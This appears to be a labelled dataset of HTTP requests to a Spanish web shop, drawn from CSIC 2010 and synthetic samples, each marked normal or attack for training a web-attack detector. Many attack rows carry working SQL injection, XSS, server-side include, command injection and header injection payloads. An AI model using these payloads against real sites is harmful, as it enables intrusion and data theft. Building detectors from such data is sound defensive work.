+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=pirr7n108&nombre=Siro&apellidos=Casaramon+Tetatzin&email=malcolm_motaung%40enlanzarote.com.yu&dni=30635705G&direccion=Cristo+Rey%2C+59%2C+2B&ciudad=Arenales+de+San+Gregorio&cp=24745&provincia=Huelva&ntc=2796424278292099&B1=Registrar,attack,csic2010
+"GET /products?user=1 UNION SELECT username,password FROM users",attack,synthetic
+PUT /tienda1/publico/registro.jsp BODY: modo=registro&login=helma&password=92H126nA&nombre=Francisco+de+Borja&apellidos=Sofra+Galcer%E1n&email=mizell%40x2.com.vu&dni=61328646C&direccion=Parc+De+La+Budellera%2C+3%2C+4-B&ciudad=Outes&cp=43421&provincia=Huesca&ntc=0417370510264127&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=ellul0&pwd=fasti-dio&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=norvig&password=boliVARiaNA&nombre=Nieves&apellidos=Freites+Figueres&email=fosse7%40yiutuve.gq&dni=38736387V&direccion=Rio+1%2C+&ciudad=Laviana&cp=45450&provincia=Valencia&ntc=7806141465394091&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ehrenfri&password=4l6AD1E14&nombre=Ail%E9n&apellidos=Amaro&email=antone1%40tiendasyofertas.ve&dni=97233442E&direccion=C%2F+Artazuri%F1a%2C+43+10%3FE&ciudad=Talarrubias&cp=03400&provincia=Granada&ntc=8954375699794509&B1=Registrar,normal,csic2010
+POST /login BODY: id=javascript:alert(document.cookie),attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=athony&password=irresoluci%F3n&nombre=Nemesio&apellidos=Bedmar&email=veronese%40prestigecars.tv&dni=99020664Y&direccion=Calle+Doctor+Jose+Manuel+Pascual+y+Pascual+146%2C+4%3FC&ciudad=Torrecilla+del+Monte&cp=29620&provincia=Valencia&ntc=0936495801431480&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=4&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=kuldip8&password=6o40o41&nombre=Indalecio&apellidos=Amodeo+Sidany&email=roadman%40wdsl.gu&dni=00916150Z&direccion=Calle+Las+Artes%2C+90%2C+&ciudad=Robledo&cp=20500&provincia=Girona&ntc=3658503055705186&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=trixi5&pwd=cel%EDcola&rememberA=off&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=moshtagh&password=e%21sca3zo&nombre=Aixa&apellidos=Poca+V%3F*a%2Clente&email=sclommari%40ceramicasmi%F1o.gm&dni=70803791Q&direccion=Plaza+Santa+Maria+La+Rica%2C+77%2C+4D&ciudad=Chalamera&cp=33777&provincia=Santa+Cruz+de+Tenerife&ntc=1250583387066531&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=missy&pwd=InViolAdA&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=avigdor4&password=COrREn7INo&nombre=Ulderico&apellidos=Soldan+Valido&email=mallalieu%40soymuyguapa.ml&dni=33727049X&direccion=Calle+Leon+92+&ciudad=Alija+del+Infantado&cp=34254&provincia=Cantabria&ntc=5543587948727405&B1=Registrar,normal,csic2010
+POST /products BODY: page=&& whoami,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=emmersto&password=inn%FAmera&nombre=Zulmara&apellidos=Estrada+Perdig%F3&email=abrams.peabody%40hojadecalculo.com.py&dni=45555264S&direccion=C%2F+Quintana+132%2C+13%3FH&ciudad=Aveinte&cp=48508&provincia=Teruel&ntc=7043934218522889&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar%3F&login=suh9&pwd=4ar9ues4a&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=7&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp/asf-logo-wide.gif/.bak,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=3381&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4628&B1=Confirmar%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=84&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5685any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Confirmar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=turbes&password=3r2667%ED3&nombre=Isra%E9l&apellidos=Orteu&email=Set-cookie%253A%2BTamper%253D1041264011025374727&dni=32080082G&direccion=Lugar+Capela+138%2C+&ciudad=Valderrodrigo&cp=43718&provincia=Teruel&ntc=2710524959634714&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7106&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=4216A&provincia=Valencia&ntc=3044392117548178&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=grimble&pwd=nardo&remember=on&B1=Entrar,normal,csic2010
+POST /view BODY: q=drop me a message,normal,synthetic
+POST /download BODY: name=5 > 3 is true,normal,synthetic
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=90&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9820&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=devouges&password=8Ub%ED&nombre=Gaia&apellidos=Trullols+Company&email=macgibbon%40adscrito.sm&dni=21449121B&direccion=Cuba%2C+S%2FN+13%3FA&ciudad=Nuez+de+Ebro&cp=26220&provincia=Teruel&ntc=1896596240334860&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=berrisfo&password=zaguERo&nombre=Neisy&apellidos=Caball%E9&email=vingelli9%40custombikesclothes.fr&dni=39202408N&direccion=C%2F+Monta%F1er+Ruiz%2C+24%2C+12A&ciudad=Fuentelmonge&cp=33560&provincia=C%E1ceres&ntc=3609841962548925&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=hiroyuki&password=desbullar&nombre=Yoconda&apellidos=Rosas+Fabila&email=saiko%40enlanzarote.com.cx&dni=29372836L&direccion=Barriada+Juan+Xxiii%2C+100%2C+&ciudad=Almargen%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=03812&provincia=Toledo&ntc=2218102599227615&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7269&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=waring&pwd=445uG4&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=kristjan&password=asiria&nombre=Gertrudis&apellidos=Massafr%E9+Danes&email=perier%40chevrolet-volt.in&dni=94097%2781L&direccion=Calle+Alfonso+Onceno%2C+167%2C+&ciudad=Alcal%E1+del+J%FAcar&cp=05210&provincia=La+Rioja&ntc=2670726326457119&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1972&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=rayna&password=sA5di-3&nombre=Rolando&apellidos=Corzo&email=mueller%40x2.com.gh&dniA=15491128F&direccion=Calle+Granate%2C+21%2C+&ciudad=Lahiguera&cp=50316&provincia=Santa+Cruz+de+Tenerife&ntc=2289103302521090&B1=Registrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=kashul&pwd=colch5da&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&loginA=rokas&password=telarejo&nombre=Si%F3n&apellidos=Eraso+Rebes&email=lapotaire%40psicoencuentronline.cc&dni=32760470Y&direccion=C%2F+Los+Arces%2C+155%2C+&ciudad=Castej%F3n+del+Puente&cp=40314&provincia=Girona&ntc=8177793043919155&B1=Registrar,attack,csic2010
+GET /view?page=admin'--,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=seelaend&password=TubuL6s8&nombre=Tulia&apellidos=Elortegi&email=schultes%40ciclismomadrile%F1o.la&dni=94900668T&direccion=Sants+De+La+Pedra+21+6C&ciudad=Trasmoz&cp=37258&provincia=Ciudad+Real&ntc=9358968631233633&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6284&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=anthea&pwd=hOrr%EDS_Ono&remember=on%2F&B1=Entrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=vanpatte&password=d35gr298r&nombre=Jon%E1s&apellidos=De+la+Pe%F1a&email=bedoya%40sunglasses.nom.dm&dni=07616528D&direccion=C%2F+Do+Gaias%2C+53%2C+1%3FB&ciudad=Lascuarre&cp=40146&provincia=La+Rioja&ntc=9589656696631384&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=cohen&password=pirr7n108&nombre=Siro&apellidos=Casaramon+Tetatzin&emailA=malcolm_motaung%40enlanzarote.com.yu&dni=30635705G&direccion=Cristo+Rey%2C+59%2C+2B&ciudad=Arenales+de+San+Gregorio&cp=24745&provincia=Huelva&ntc=2796424278292099&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=37&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=gdowik2&password=29%3Fem2ti3a&nombre=Grecia&apellidos=Ar%E1n+Pola&email=fravel%40filtraciondehumos.sz&dni=48171319G&direccion=El+Vito%2C+90+&ciudad=Ampolla%2C+L%27&cp=50100&provincia=Castell%F3n&ntc=1798713909636768&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=chikai&password=escato1%F3gic*o&nombre=Macario&apellidos=Sarrat+Velado&email=wattis%40mataroweb.lr&dni=30833301F&direccion=Baro+Pierre+De+Cubertin%2C+179%2C+3%3FD&ciudad=Tollos&cp=12312&provincia=Huesca&ntc=4127869254393637&B1=Registrar,normal,csic2010
+POST /view BODY: id=admin'--,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=yuri2&password=lin%3F6&nombre=Nery&apellidos=Fuillerat+Lauli%E9&email=bremen%40ocymafa.pa&dni=00846926C&direccion=C%2F+Cadmi%2C+97+1%3FA&ciudad=Nombrevilla&cp=20100&provincia=Burgos&ntc=9357244380338507&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=thuy&password=vafoSa&nombre=Tosca&apellidos=Pica%F1ol+Pedreira&email=%40cr%40anh%40am%404horas.ki&dni=80624196L&direccion=Igualada%2C+157+&ciudad=Breda&cp=08348&provincia=Segovia&ntc=2333713014492030&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=dal&password=ATaCado&nombre=Renata&apellidos=Anto%F1anzas+Cusquisiban&email=binns%40maxitienda.gs&dni=29524752C&direccion=Calle+Colonia+Zepol%2C+87%2C+4%3FE&ciudad=San+Mart%EDn+de+Unx&cp=03830&provincia=%C1vila&ntc=1285699347197532&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=viriya5&password=283u8n1s&nombre=Magal%ED&apellidos=Alcrudo+Moya&email=nelm_ambengat%40cubiertoscbb.pm&dni=10753504S&direccion=Passatge+Marina+De+Llevant+154+4%3FF&ciudad=Peralejos+de+las+Truchas&cp=38370&provincia=Segovia&ntc=8025394276056024&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1073&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=angeline0%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=tasajo&nombre=Anatal%F3n&apellidos=Gironell+Nurnberg&email=alari-clayton%40blueeyes.mm&dni=02864580E&direccion=C%2F+Pescadores+De+Terranova%2C+108%2C+9-E&ciudad=Gironella&cp=34309&provincia=Lleida&ntc=1940469779787284&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=lorrayne&password=anofele6&nombre=Neliana&apellidos=Monllor+Mascort&email=tsaganeas%40mccomptables.my&dni=26431261Y&direccion=Calle+Begonia+47%2C+&ciudad=Recuenco%2C+El&cp=44168&provincia=Salamanca&ntc=7168408229054610paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=lauro&password=57rsant2541&nombre=Iolaf&apellidos=Bogs+Terradas&email=anys%40ebuy.com.tr&dni=19109062H&direccion=C%2F+Guadiana+80+13-A&ciudad=Sarri%E0+de+Ter&cp=50490&provincia=Girona&ntc=1006455310670976&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8588&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,attack,csic2010
+POST /profile BODY: comment=5 > 3 is true,normal,synthetic
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombreA=Queso+Manchego&precio=100&cantidad=28&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=587&B1=Pasar+por+caja,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=gallard&pwd=por6am6n0eo&remember=off&B1=Entrar,normal,csic2010
+GET /contact?id=| dir C:\,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8285&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=kuehn&password=c7el4&nombre=Lelis&apellidos=Gasset+Boulandier&email=darby%40muebemiweb.mobi&dni=47951538B&direccion=Camilo+Martinon+Navarro+129+13B&ciudad=Puebla+del+Pr%EDncipe&cp=22310&provincia=Girona&ntc=7035726948316645&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=parkash6&password=tornillo&nombre=Isa%EDas&apellidos=Mansur+Morales&email=ragovic%40fichajes.nom.pe&dni=66467903L&direccion=Calle+Puerto+De+Balbaran%2C+63%2C+12%3FD&ciudad=Laukiz&cp=08783&provincia=Pontevedra&ntc=0882217820565052&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=schutte&password=hu7a&nombre=Serapio&apellidos=Barrionuevo+Burunat&email=lune-dulier%40natravea.py&dni=72824002E&direccion=C%2F+Puerta+De+Murcia+90+12%3FF&ciudad=Boss%F2st&cp=17462&provincia=C%E1ceres&ntc=7261809327587258&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=waggoner&pwd=rosquiller3&remember=on&B1=Entrar,normal,csic2010
+GET /search?page=42,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=don&pwd=co4trO5ersa&remember=%4040&B1=Entrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=56&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/vaciar.jsp BODY: B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,attack,csic2010
+POST /contact BODY: id=%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E,attack,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=trek_&password=adjurable&nombre=Brigitte&apellidos=Santill%E1n+Dennett&email=boykin%40cienciapolicial.gr&dni=71648159P&direccion=Calle+Isis%2C+152%2C+&ciudad=Garciaz&cp=03450&provincia=Granada&ntc=2044220684799297&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&loginA=raymund&pwd=pist%F3n&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7613&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=merritt&password=9a68d2&nombre=Inti&apellidos=Restrepo+Aldaba&email=eisenfeld%40didacramirez.ma&dni=07178610B&direccion=Calle+Soledad%2C+22+&ciudad=Rojas&cp=23770&provincia=C%E1ceres&ntc=7432496591066069&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=biamonte&password=yAg9a&nombre=Filipo&apellidos=Serfaty+Solivella&email=pepper%40didacramirez.nl&dni=36000666P&direccion=C%2F+De+Chapi+92%2C+&ciudad=Pozo+de+Almoguera&cp=31219&provincia=Burgos&ntc=1761915091924529&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=marven&password=4u4yAd5&nombre=Iraci&apellidos=Corrius&email=aleandro-hayman%40tecnoindomo.nr&dni=85233754D&direccion=Calle+Diseminado+Hornos+De+Rey+29%2C+7%3FB&ciudad=Luesia&cp=16118&provincia=Granada&ntc=9828593749535082&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5251&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9350&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=barenie&password=saga*z&nombre=Casildo&apellidos=Augueses+Anto%F1anzas&email=ione%40likeanangel.mh&dni=52187187A&direccion=Gomera%2C+S%2FN%2C+2%3FD&ciudad=Saca%F1et&cp=19118&provincia=Valladolid&ntc=5382014853813321&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=lauderda&password=g1o9er1%ED0&nombre=Nicastro&apellidos=Barnechea&email=rattray%40elgrancolisionadordehadrones.gl&dni=80029600L&direccion=Castillo+De+Malpica+119%2C+&ciudad=Santa+Fe+de+Mond%FAjar&cp=08455&provincia=Lleida&ntc=6820667917309161&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=copley2&pwd=L%24isonjEaNte&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2191&B1=Pasar+por+caja,normal,csic2010
+GET /products?name=drop me a message,normal,synthetic
+GET /download?comment=alice@example.com,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=chaz&pwd=8370VESaD9&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=margriet&password=tr71782Rir&nombre=Vicko&apellidos=Ciurans&email=dawney-raakhee%40vilainstal.pr&dni=73615364T&direccion=Calle+Maestro+Navas%2C+135+6%3FF&ciudad=Picanya&cp=46143&provincia=Zamora&ntc=5027228435204344&B1=Registrar,normal,csic2010
+POST /search BODY: comment=%27%20Or%201%3D1%20--,attack,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=chungsik6&password=inten-sament6&nombre=Edda&apellidos=Balseca+Figueras&email=shenar%40nikemujeres.gg&dni=16934679D&direccion=Zearkaleta+Arbolantza%2C+65+1-A&ciudad=Cass%E0+de+la+Selva&cp=17869&provincia=Burgos&ntc=3345463772576828&B1=Registrar,normal,csic2010
+POST /tienda1/publico/caracteristicas.jsp BODY: id=2%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,attack,csic2010
+PUT /tienda1/miembros/editar.jsp BODY: modo=registro&login=rockford&password=eng68nd13i8ient5&nombre=Saiguen&apellidos=Gramunt+Alzuria&email=berthels-dahlbeck%40muevemiweb.br&dni=87238782N&direccion=Pozo+188+3%3FG&ciudad=C%E1ceres&cp=06197&provincia=Valencia&ntc=8495227312439801&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=24&B1=A%F1adir+al+carrito,attack,csic2010
+PUT /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9044&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=joannidi&pwd=ArBO%2C%2Fla%27do&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=207&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=sides&pwd=tRANZ1Do&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=glori&password=m8sa&nombre=Stavros&apellidos=Carrillo+Intxaurraga&email=lucachevski%40aou.com.gw&dni=50878251C&direccion=C%2F+Seneca%2C+30+&ciudad=Real+de+la+Jara%2C+El&cp=28690&provincia=C%E1ceres&ntc=6508622053614944&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=shiranth5&password=petal9192&nombre=Nelma&apellidos=Rayo+Jal%F3n&email=dubucourt-geoffrey%40intercambioenlaces.name&dni=7B0B624B341N&direccion=Pla%E7a+D%27+Espanya+36+6-E&ciudad=Penagos&cp=10240&provincia=M%E1laga&ntc=1634165251818381&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=940&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=jerrilyn&pwd=almiral&remember=on&B1=Entrar,normal,csic2010
+POST /products BODY: email=john,normal,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=davina&password=53%24nse0a0le&nombre=Greta&apellidos=Tress+Jan%E9&email=kalinowski5%40minimizar.az&dni=85473715B&direccion=Av.+Viana+7+13%2B*%3FD&ciudad=Agoncillo&cp=40152&provincia=Salamanca&ntc=6165671894107883&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=6244&B1=%257C,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=yuanshin2&password=3i%E98863&nombre=Alvaro&apellidos=Portet+Malet&email=langan-lithgow%40redesmilitantes.iq&dni=17807421Q&direccion=San+Eduardo%2C+72+&ciudad=Cifuentes&cp=50343&provincia=Castell%F3n&ntc=2461320335690641&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=auton&pwdA=gubi9&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5930&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=36&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8409&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=wilie&password=v9n939z6&nombre=Gina&apellidos=Subir%F3s+Figaredo&email=urchins%40waikilu.mg&dni=93698052P&direccion=Gredos%2C+114+12%3FG&ciudad=Castroverde&cp=05520&provincia=Burgos&ntc=7277765230207053&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertarany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=8789&B1=Confirmar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=irissou&password=ceg.ama&nombre=No%E9&apellidos=Esp%EDndola+Pavajeau&email=heal%40quadernideilgarda.gob&dni=19187311K&direccion=Hartzenbusch+98+&ciudad=Sagunto%2FSagunt&cp=45314&provincia=Baleares+%28Illes%29&ntc=8622247853302054&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=85&cantidad=85&B1=A%F1adir+al+carrito,normal,csic2010
+POST /search BODY: comment=<body onload=alert('XSS')>,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=saladna&password=e67e0m307r&nombre=Petronio&apellidos=Maduell+Rom%E0&email=ruchama_hellberg%40doloresmusculares.pw&dni=11700379A&direccion=Evangelina+Sobredo+Galanes%2C+S%2FN+12-C&ciudad=Purujosa&cp=08348&provincia=Lleida&ntc=8153377554882034&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precioA=39&cantidad=4&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=calow&pwd=ensa%F1ada&remember=off%2F&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=mcgonagl&password=escol%E1stico&nombre=Alom%EDas&apellidos=Bauz%E0+Naval%F3n&email=zeiniker%40powerthink.tl&dni=46149643M&direccion=C%2F+Huerta+Del+Ca%F1o%2C+195%2C+&ciudad=Deltebre&cp=37450&provincia=Burgos&ntc=7069765951057318&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=caudill&password=f5010&nombre=Neliana&apellidos=Cachiner+Grabal%F3s&email=day-lewis-cutell7%40google-movil.org&dni=23415369N&direccion=Carrer+Lepant%2C+126%2C+7%3FG&ciudad=Rillo&cp=15391&provincia=M%E1laga&ntc=7792981300472036&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=januario&pwd=entorcarse&remember=on%2F&B1=Entrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=shengwu4&password=al%21ferezado&nombre=Remy&apellidos=Font+Vilaubi&email=caubere%40koinup.ck&dni=62137860W&direccion=Calle+Arnau+De+Vilanova+25+&ciudad=Total%E1n&cp=19182&provincia=Soria&ntc=9963434471932857&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=darryl&pwdA=cala%F1%E9s&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=kuehne&password=sobRE8e%D1o&nombre=Leon%EDdas&apellidos=Orenday&email=polonah%40blanquillos.mobi&dni=38494290H&direccion=Avinguda+Marques+De+Sant+Mori%2C+138%2C+&ciudad=Ezcabarte&cp=45680&provincia=A+Coru%F1a&ntc=1351127649843855&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=dean&password=C1LAB8&nombre=Brigida&apellidos=Isunza&email=pouira%40maridosadomicilio.ec&dni=94430620A&direccion=Calle+Dean+Miranda+106%2C+6-F&ciudad=Badolatosa&cp=44711&provincia=Almer%EDa&ntc=9067788407413640&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=kenol4&password=1ngul3idor&nombre=Octavia&apellidos=Senar+Slachevsky&email=keller%40flipflap.nz&dni=91212440Y&direccion=Calle+Gonzalo+Puerto+Mezquita%2C+183%2C+&ciudad=Santa+B%E0rbara&cp=42192&provincia=Albacete&ntc=7629740795276147&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=waite&password=Hist%D3RI985Ent0&nombre=Argeo&apellidos=Bellveh%ED+Badrenas&email=dax-branson%40indianabilljaen.kp&dni=96685723W&direccion=Pasaje+Navarra%2C+98%2C+&ciudad=Banyeres+del+Pened%E8s&cp=50269&provincia=Salamanca&ntc=4550615091902563&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=alverta&pwd=pesquisar&remember=on&B1=Entrar,normal,csic2010
